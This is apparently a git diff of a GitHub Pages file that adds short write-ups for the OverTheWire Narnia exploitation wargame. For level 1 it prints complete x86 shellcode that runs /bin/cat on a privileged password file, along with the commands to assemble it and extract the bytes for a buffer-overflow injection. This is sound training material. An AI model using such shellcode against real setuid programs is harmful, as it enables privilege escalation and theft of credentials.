@@ -1,19 +1,53 @@
-## Welcome to GitHub Pages
+## Narnia Solutions
 
-You can use the [editor on GitHub](https://github.com/int3rsys/Narnia-solutions/edit/master/index.md) to maintain and preview the content for your website in Markdown files.
+Here are short solutions I have written for Narnia levels. This is a wargame in overthewire.org. The main subject of the game is exploitation. I wrote only where I felt that there were not many sufficient solutions to the level.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+### Narnia0
 
-### Markdown
+Well, I think that there are plany well written solutions for this level. I would like to mention, however, that the shellcode should be generated inside the shell (use python or ruby or perl, etc') because for some unusual reason, pasting a prepeared shellcode inside the shell **will not work**.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
 
-```markdown
-Syntax highlighted code block
+### Narnia1
 
-# Header 1
-## Header 2
-### Header 3
+To solve this level, we need to know assembly, x86 in this case (typing "lscpu" will reveal us the architecture and byte order, which are **important** for out shellcode). There are planty writeup's for this level, which most of them are incorrect (but I do recommand reading them in order to understand what is wrong), however. Moreover, I would advise you to learn how to write a shellcode in linux, because copying and pasting a shellcode from shell storm won't work in this case. So after we figure out that there is a buffer overflow with the enviromental variable, we want to inject our shellcode. Remeber, no null bytes and illegal chars!
+Because spawning a regular shell won't work (the shell will be privileged with narnia1 user), we want to use the our vulnerability to open narnia2 password file. Let's dive into our shell code:
+
+`
+section .text
+	global _start
+
+_start:
+	xor eax,eax
+	push eax          ;end of the /bin/cat string
+	push 0x7461632f
+	push 0x6e69622f
+	mov ebx, esp      ;ebx points to the start of the string
+	push eax
+	push 0x3261696e
+	push 0x72616e2f
+	push 0x73736170
+	push 0x5f61696e
+	push 0x72616e2f
+	push 0x6374652f
+	mov ecx, esp      ;ecx points to the start of the string (/etc/narnia_pass/narnia2)
+  push eax          ;array has to end with null
+	mov al, 11        ;we use execve syscall, numbered 11
+	mov edx, esp      ;edx points to null (we don't need char *const envp[])
+	push ecx          ;push the first arg (/etc/narnia_pass/narnia2)
+	push ebx          ;push the second arg (/bin/cat
+	mov ecx, esp      ;ecx points to array with two args
+	int 0x80
+`
+Now, we want to compile our code and link it, thus:
+`nasm -f elf shell.asm -o shell.o
+ld -m elf_i386 -s shell.o -o shell
+`
+(-m elf_i386 is not necessary, but was in my case)
+
+Okay, let's extract our shellcode:
+`for i in $(objdump -M intel -d shell | grep "^ "|cut -f2); do echo -n '\x'$i;done;echo`
+and wallah!
+
 
 - Bulleted
 - List
